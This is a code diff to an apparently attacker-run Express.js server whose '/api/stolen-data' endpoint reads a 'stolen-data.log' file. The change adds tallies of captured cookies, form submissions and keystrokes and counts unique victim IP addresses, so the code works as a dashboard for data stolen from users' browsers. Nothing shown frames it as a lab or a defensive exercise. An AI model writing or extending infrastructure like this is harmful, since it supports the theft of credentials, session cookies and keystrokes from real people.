@@ -65,7 +65,20 @@ app.get('/api/stolen-data', (req, res) => {
         const logPath = '/app/logs/stolen-data.log';
         if (fs.existsSync(logPath)) {
             const logs = fs.readFileSync(logPath, 'utf8').split('\n').filter(line => line.trim());
-            res.json({ logs: logs.slice(-20) }); // Last 20 entries
+            const uniqueIPs = new Set();
+            logs.forEach(log => {
+                const ipMatch = log.match(/from ([\d\.:]+):/);
+                if (ipMatch) uniqueIPs.add(ipMatch[1]);
+            });
+            res.json({
+                logs: logs.slice(-20), // Last 20 entries for display
+                totalCounts: {
+                    cookies:    logs.filter(l => l.includes('COOKIES')).length,
+                    formData:   logs.filter(l => l.includes('FORM_DATA')).length,
+                    keystrokes: logs.filter(l => l.includes('KEYSTROKES')).length,
+                    victims:    uniqueIPs.size
+                }
+            });
         } else {
             res.json({ logs: [] });
         }
